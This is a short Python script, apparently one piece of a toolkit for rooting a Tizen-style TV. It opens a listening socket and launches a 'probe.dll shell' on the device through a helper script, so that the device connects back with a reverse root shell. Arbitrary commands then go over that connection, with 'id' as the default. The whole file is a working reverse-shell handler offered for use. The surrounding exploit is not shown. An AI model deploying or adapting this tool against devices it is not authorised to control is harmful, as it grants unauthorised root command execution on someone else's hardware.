#!/usr/bin/env python3
import os, socket, subprocess, sys, threading, time

HOST_IP = os.environ.get("M5_HOST_IP", "192.168.0.2")
WORKDIR = os.path.dirname(os.path.abspath(__file__))
TVRUN = os.path.join(WORKDIR, "tvrun.py")

class RootShell:
    def __init__(self):
        self.srv = socket.socket()
        self.srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.srv.bind(("0.0.0.0", 0))
        self.srv.listen(1)
        self.port = self.srv.getsockname()[1]
        self.conn = None

    def start(self):
        cmd = f"/usr/bin/dotnet-launcher /opt/usr/a/probe.dll shell {HOST_IP} {self.port}"
        env = dict(os.environ, NOCB="1")
        p = subprocess.run([sys.executable, TVRUN, cmd], cwd=WORKDIR, env=env,
                           stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=90)
        print("[launch]", p.stdout.decode(errors="replace").strip(), flush=True)
        self.srv.settimeout(60)
        self.conn, addr = self.srv.accept()
        self.conn.settimeout(30)
        data = b""
        while b"\n" not in data:
            data += self.conn.recv(4096)
        print("[ready]", data.decode(errors="replace").strip(), flush=True)
        return self

    def cmd(self, command, timeout=30):
        self.conn.sendall((command + "\n").encode())
        data = b""
        self.conn.settimeout(timeout)
        while b"__RC=" not in data:
            chunk = self.conn.recv(65536)
            if not chunk:
                break
            data += chunk
        return data.decode(errors="replace")

    def close(self):
        try: self.conn.sendall(b"exit\n")
        except Exception: pass
        try: self.conn.close()
        except Exception: pass
        self.srv.close()

if __name__ == "__main__":
    sh = RootShell().start()
    for command in sys.argv[1:] or ["id"]:
        print(f"$ {command}")
        print(sh.cmd(command), end="")
    sh.close()
